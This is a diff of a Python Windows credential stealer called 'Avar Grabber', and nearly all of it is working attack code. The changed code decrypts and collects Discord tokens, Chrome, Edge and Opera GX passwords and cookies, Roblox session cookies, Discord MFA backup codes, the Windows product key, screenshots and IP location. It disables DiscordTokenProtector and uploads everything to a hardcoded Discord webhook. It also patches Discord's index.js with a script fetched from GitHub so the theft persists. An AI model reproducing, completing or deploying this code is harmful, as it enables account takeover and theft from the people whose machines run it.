@@ -1,3 +1,4 @@
+
 import os
 import requests
 import shutil
@@ -6,7 +7,9 @@ import zipfile
 import json
 import base64 
 import psutil
+import subprocess
 
+from threading import Thread
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from re import findall
@@ -14,12 +17,14 @@ from Crypto.Cipher import AES
 
 class Avar_Grabber:
     def __init__(self):
-        self.webhook = "WEBHOOK HERE"
-        self.files = ""
+        self.webhook = "https://discord.com/api/webhooks/907415831984623627/EZa8-81mZdwo4ii5DjPQSEKqRJBLzvAwG_pfFSx7E6fe75akB09V5GFQ-WQBfUXOlkzs" #replace WEBHOOK_HERE with your webhook
+
+        self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Avar_Grabber"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -27,55 +32,47 @@ class Avar_Grabber:
             pass
 
         self.tokens = []
+        self.robloxcookies = []
+        self.files = ""
         self.discord_psw = []
         self.backup_codes = []
         
-        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
-            self.bypass_better_discord()
-
-        if not os.path.exists(self.appdata+'\\Google'):
+        self.bypassBetterDiscord()
+        self.operagxpsw()
+        self.operagxhist()
+        self.edgehist()
+        self.edgepsw()
+        self.grabhist()
+        self.bypassTokenProtector()
+        if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
-            self.axd()
+            self.grabPassword()
+            self.grabCookies()
+        Thread(target=self.screenshot).start()
+        Thread(target=self.killDiscord).start()
         self.grabTokens()
         self.neatifyTokens()
-        self.screenshot()
+        self.grabRobloxCookie()
         for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
-                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
-                    x = f.read()
-                    if x != "":
+                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
+                    x = ff.read()
+                    if not x:
                         with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
-                            f.write("Made by Cl1cker\n\n")
+                            f.write("Made by Sarah | https://github.com/Sarahh731/Avar-Token-Grabber\n\n")
                         with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
-                            fp.write(x)
-                            fp.write("\n\nMade by Cl1cker")
+                            fp.write(x+"\n\nMade by Sarah | https://github.com/Sarahh731/Avar-Token-Grabber")
                     else:
-                        f.close()
                         try:
                             os.remove(self.tempfolder+os.sep+i)
                         except Exception:
                             print("ok")
 
         self.SendInfo()
-        #self.Injection()
-        try:
-            shutil.rmtree(self.tempfolder)
-        except (PermissionError, FileNotFoundError):
-            pass
-
-
-    def axd(self):
-        self.grabPassword()
-        self.grabCookies()
-        self.operagxpsw()
-        self.operagxcookies()
-        self.operagxhist()
-        self.edgecookies
-        self.edgehist()
-        self.edgepsw()
-        self.grabhist()
-
+        self.Injection()
+        shutil.rmtree(self.tempfolder)
+        
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
             "Content-Type": content_type,
@@ -86,20 +83,16 @@ class Avar_Grabber:
         return headers
 
     def Injection(self):
-        for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in\
-            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
-                try:
-                    proc.kill()
-                except psutil.NoSuchProcess:
-                    pass
         for root, dirs, files in os.walk(self.appdata):
             for name in dirs:
                 if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Avar"))
                     except FileNotFoundError:
+                        pass
+                    try:
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Avar"))
+                    except FileExistsError:
                         pass
                     f = requests.get("https://raw.githubusercontent.com/Sarahh731/Injectionn/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
@@ -109,9 +102,7 @@ class Avar_Grabber:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
-    def bypass_token_protector(self):
-        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
-        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+    def killDiscord(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in\
             ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
@@ -119,13 +110,18 @@ class Avar_Grabber:
                     proc.kill()
                 except psutil.NoSuchProcess:
                     pass
+
+    def bypassTokenProtector(self):
+        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        config = tp+"config.json"
         for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
             try:
                 os.remove(tp+i)
             except Exception:
                 pass 
         try:
-            with open(tp+"config.json") as f:
+            with open(config) as f:
                 item = json.load(f)
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
@@ -141,51 +137,60 @@ class Avar_Grabber:
                 item['iterations_key'] = 457
                 item['version'] = 69420
 
-            with open(tp+"config.json", 'w') as f:
+            with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
 
-            with open(tp+"config.json", 'a') as f:
-                f.write("\n\n//Cl1cker just shit on this token protector")
+            with open(config, 'a') as f:
+                f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
         except Exception:
             pass
 
-    def bypass_better_discord(self):
+    def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
-        with open(bd, "rt", encoding="cp437") as f:
-            content = f.read()
-            content2 = content.replace("api/webhooks", "Cl1ckerTheGoat")
-        with open(bd, 'w'): pass
-        with open(bd, "wt", encoding="cp437") as f:
-            f.write(content2)
+        if os.path.exists(bd):
+            x = "api/webhooks"
+            with open(bd, "r+", errors="ignore") as f:
+                l = f.readlines()
+                for i in l:
+                    if x in i:
+                        Replacement = i.replace(x, "Avar")
+                        l = Replacement
+                f.writelines(l)
 
-    def get_master_key(self):
-        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
+    def getProductValues(self):
+        try:
+            wkey = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
+        except:
+            wkey = "N/A (Likely Pirated)"
+        try:
+            productName = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
+        except:
+            productName = "N/A"
+        return [productName, wkey]
+
+    def get_master_key(self, path):
+        with open(path, "r", encoding="utf-8") as f:
             local_state = f.read()
         local_state = json.loads(local_state)
+
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
     
-    def decrypt_payload(self, cipher, payload):
-        return cipher.decrypt(payload)
-    
-    def generate_cipher(self, aes_key, iv):
-        return AES.new(aes_key, AES.MODE_GCM, iv)
-    
     def decrypt_password(self, buff, master_key):
         try:
             iv = buff[3:15]
             payload = buff[15:]
-            cipher = self.generate_cipher(master_key, iv)
-            decrypted_pass = self.decrypt_payload(cipher, payload)
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
-        except:
-            return "Encrypted Dick"
+        except Exception:
+            return "Failed to decrypt password"
 
     def grabPassword(self):
-        master_key = self.get_master_key()
+        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
         f = open(self.tempfolder+"\\Chrome Passwords.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Cl1cker | https://github.com/Cl1ckerr/Avar-Token-Grabber\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
@@ -222,36 +227,6 @@ class Avar_Grabber:
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key  
-    
-    def edgecookies(self):
-        master_key = self.get_master_keyedge()
-        f = open(self.tempfolder+"\\Edge Cookies.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Cl1cker | https://github.com/Cl1ckerr/Avar-Token-Grabber\n\n")
-        login_db = self.appdata+'\\Microsoft\\Edge\\User Data\\Default\\cookies'
-        try:
-            shutil.copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
-            pass
-        conn = sqlite3.connect("Loginvault.db")
-        cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-            for r in cursor.fetchall():
-                Host = r[0]
-                user = r[1]
-                encrypted_cookie = r[2]
-                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                if Host != "":
-                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-        except:
-            pass
-        f.close()
-        cursor.close()
-        conn.close()
-        try:
-            os.remove("Loginvault.db")
-        except:
-            pass
 
     def edgepsw(self):
         master_key = self.get_master_keyedge()
@@ -347,35 +322,6 @@ class Avar_Grabber:
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key  
     
-    def operagxcookies(self):
-        master_key = self.get_master_keygx()
-        f = open(self.tempfolder+"\\Opera GX Cookies.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Sarah | https://github.com/Sarahh731/Avar-Token-Grabber\n\n")
-        login_db = self.roaming+'\\Opera Software\\Opera GX Stable\\cookies'
-        try:
-            shutil.copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
-            pass
-        conn = sqlite3.connect("Loginvault.db")
-        cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-            for r in cursor.fetchall():
-                Host = r[0]
-                user = r[1]
-                encrypted_cookie = r[2]
-                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                if Host != "":
-                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-        except:
-            pass
-        f.close()
-        cursor.close()
-        conn.close()
-        try:
-            os.remove("Loginvault.db")
-        except:
-            pass
 
     def operagxpsw(self):
         master_key = self.get_master_keygx()
@@ -435,34 +381,40 @@ class Avar_Grabber:
             pass     
 
     def grabCookies(self):
-        master_key = self.get_master_key()
-        f = open(self.tempfolder+"\\Chrome Cookies.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Sarah | https://github.com/Sarahh731/Avar-Token-Grabber\n\n")
-        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
+        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
+        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
+        except Exception:
             pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-            for r in cursor.fetchall():
-                Host = r[0]
-                user = r[1]
-                encrypted_cookie = r[2]
-                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                if Host != "":
-                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-        except:
-            pass
-        f.close()
+        with open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
+            try:
+                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+                for r in cursor.fetchall():
+                    host = r[0]
+                    user = r[1]
+                    decrypted_cookie = self.decrypt_password(r[2], master_key)
+                    if host != "": f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)
+            except Exception:
+                pass
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
-        except:
+        except Exception:
             pass
+
+    def grabRobloxCookie(self):
+        try:
+            self.robloxcookies.append(subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000).decode().rstrip())
+        except Exception:
+            pass
+        if self.robloxcookies:
+            with open(self.tempfolder+"\\Roblox Cookies.txt", "w") as f:
+                for i in self.robloxcookies: f.write(i+'\n')
 
     def grabTokens(self):
         paths = {
@@ -489,26 +441,37 @@ class Avar_Grabber:
             'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
-
-        for source, path in paths.items():
+        
+        for _, path in paths.items():
             if not os.path.exists(path):
                 continue
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (self.regex):
-                        for token in findall(regex, line):
-                            try:
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
-                            except Exception:
-                                pass
-                            if r.status_code == 200:
-                                if token in self.tokens:
-                                    continue
-                                self.tokens.append(token)
-        if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
-            for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
+            if not "discord" in path:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                except Exception:
+                                    pass
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
+            else:
+                if os.path.exists(self.roaming+'\\discord\\Local State'):
+                    for file_name in os.listdir(path):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in findall(self.encrypted_regex, line):
+                                token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                if r.status_code == 200 and token not in self.tokens:
+                                    self.tokens.append(token)
+
+        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
@@ -516,33 +479,28 @@ class Avar_Grabber:
                         for regex in (self.regex):
                             for token in findall(regex, line):
                                 try:
-                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                 except Exception:
                                     pass
-                                if r.status_code == 200:
-                                    if token in self.tokens:
-                                        continue
+                                if r.status_code == 200 and token not in self.tokens:
                                     self.tokens.append(token)
-                                    
+              
     def neatifyTokens(self):
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
-            try:
-                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
-            except Exception:
-                pass
-            user = j["username"] + "#" + str(j["discriminator"])
+            j = requests.get(self.baseurl, headers=self.getheaders(token)).json()
+            user = j.get('username') + '#' + str(j.get("discriminator"))
 
             if token.startswith("mfa.") and self.discord_psw:
                 with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
                     fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
                     for x in self.discord_psw:
                         try:
-                            r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
-                            for i in r["backup_codes"]:
+                            r = requests.post(self.baseurl+"/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
+                            for i in r.get("backup_codes"):
                                 if i not in self.backup_codes:
                                     self.backup_codes.append(i)
-                                    fp.write(f'\t{i["code"]} | {"Already used" if i["consumed"] == True else "Not used"}\n')
+                                    fp.write(f'\t{i.get("code")} | {"Already used" if i.get("consumed") == True else "Not used"}\n')
                         except Exception:
                             pass
             badges = ""
@@ -558,17 +516,16 @@ class Avar_Grabber:
             if (flags == 16384): badges += "Gold BugHunter, "
             if (flags == 131072): badges += "Verified Bot Developer, "
             if (badges == ""): badges = "None"
-            user = j["username"] + "#" + str(j["discriminator"])
-            email = j["email"]
-            phone = j["phone"] if j["phone"] else "No Phone Number attached"
+            email = j.get("email")
+            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
             try:
-                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
             except Exception:
                 pass
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
             try:
-                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
             except Exception:
                 pass
             f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
@@ -585,10 +542,11 @@ class Avar_Grabber:
         image.close()
 
     def SendInfo(self):
-        wkey = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
+        wname = self.getProductValues()[0]
+        wkey = self.getProductValues()[1]
         ip = country = city = region = googlemap = "None"
         try:
-            data = requests.get("http://ipinfo.io/json").json()
+            data = requests.get("https://ipinfo.io/json").json()
             ip = data['ip']
             city = data['city']
             country = data['country']
@@ -609,7 +567,6 @@ class Avar_Grabber:
         for f in files:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Files Found: "
-        backslash = "\n"
         embed = {
             "username":"Avar Grabber",
             "avatar_url":"https://cdn.discordapp.com/attachments/922610957316919307/924709101815091291/kawai.png",
@@ -620,7 +577,7 @@ class Avar_Grabber:
                         "url": "https://github.com/Cl1ckerr/Avar-Token-Grabber",
                         "icon_url": "https://cdn.discordapp.com/attachments/922610957316919307/924709101815091291/kawai.png"
                     },
-                    "description": f'**{os.getlogin()}** Run The Avar Grabber :sob:\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}{backslash+"Windows Key: "+wkey if wkey else ""}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+                    "description": f'**{os.getlogin()}** Just ran Avar Grabber\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                     "color": 15158332,
 
                     "thumbnail": {
@@ -638,4 +595,4 @@ class Avar_Grabber:
         os.remove(_zipfile)
 
 if __name__ == "__main__":
-    Avar_Grabber()
+    if os.name == "nt": Avar_Grabber()
